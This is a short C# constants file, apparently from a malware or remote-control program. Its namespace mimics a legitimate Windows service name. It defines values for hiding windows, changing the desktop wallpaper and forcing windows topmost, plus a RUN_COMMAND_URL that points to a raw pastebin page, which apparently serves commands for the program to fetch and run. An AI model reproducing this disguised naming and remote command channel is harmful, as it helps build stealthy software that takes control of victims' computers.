using System;

namespace ServiceHub.Host.Node
{
    class Const
    {
        public const int SW_HIDE = 0;
        public const int SW_SHOW = 5;
        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_UPDATEINIFILE = 0x01;
        public const int SPIF_SENDWININICHANGE = 0x02;
        public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        public const UInt32 SWP_NOSIZE = 0x0001;
        public const UInt32 SWP_NOMOVE = 0x0002;
        public const UInt32 TOPMOST_FLAGS = SWP_NOMOVE | SWP_NOSIZE;
        public const string RUN_COMMAND_URL = "http://pastebin.com/raw/rkezDRfN";
    }
}
